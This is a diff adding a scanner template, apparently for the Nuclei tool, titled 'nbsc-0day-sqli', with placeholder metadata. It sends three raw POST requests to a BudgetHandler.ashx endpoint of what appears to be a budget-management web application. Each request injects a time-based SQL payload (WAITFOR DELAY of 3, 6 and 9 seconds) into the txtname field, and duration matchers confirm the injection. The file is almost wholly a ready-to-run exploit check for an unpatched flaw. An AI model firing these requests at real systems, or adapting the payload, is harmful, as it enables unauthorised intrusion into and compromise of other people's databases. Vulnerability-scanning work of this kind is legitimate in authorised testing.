@@ -1,0 +1,66 @@
+id: nbsc-0day-sqli
+info:
+  name: nbsc-0day-sqli
+  author: apple
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /Handlers/BudgetHandler.ashx?action=mk_planmonthdrivingcolumn2 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 82
+        Accept: application/json, text/javascript, */*; q=0.01
+        X-Requested-With: XMLHttpRequest
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Origin: http://{{Hostname}}
+        Referer: http://{{Hostname}}/Homepage/HomeCounts.aspx?menuid=0090
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: ASP.NET_SessionId=yzkxde4ylszx2xj1owtt4q4p; easyuiThemeName=default
+        Connection: keep-alive
+
+        StartYearMonth=2024-1&EndYearMonth=2024-5&txtname=1'%3bWAITFOR+DELAY+'0%3a0%3a3'--
+      - |-
+        POST /Handlers/BudgetHandler.ashx?action=mk_planmonthdrivingcolumn2 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 82
+        Accept: application/json, text/javascript, */*; q=0.01
+        X-Requested-With: XMLHttpRequest
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Origin: http://{{Hostname}}
+        Referer: http://{{Hostname}}/Homepage/HomeCounts.aspx?menuid=0090
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: ASP.NET_SessionId=yzkxde4ylszx2xj1owtt4q4p; easyuiThemeName=default
+        Connection: keep-alive
+
+        StartYearMonth=2024-1&EndYearMonth=2024-5&txtname=1'%3bWAITFOR+DELAY+'0%3a0%3a6'--
+      - |-
+        POST /Handlers/BudgetHandler.ashx?action=mk_planmonthdrivingcolumn2 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 82
+        Accept: application/json, text/javascript, */*; q=0.01
+        X-Requested-With: XMLHttpRequest
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Origin: http://{{Hostname}}
+        Referer: http://{{Hostname}}/Homepage/HomeCounts.aspx?menuid=0090
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: ASP.NET_SessionId=yzkxde4ylszx2xj1owtt4q4p; easyuiThemeName=default
+        Connection: keep-alive
+
+        StartYearMonth=2024-1&EndYearMonth=2024-5&txtname=1'%3bWAITFOR+DELAY+'0%3a0%3a9'--
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
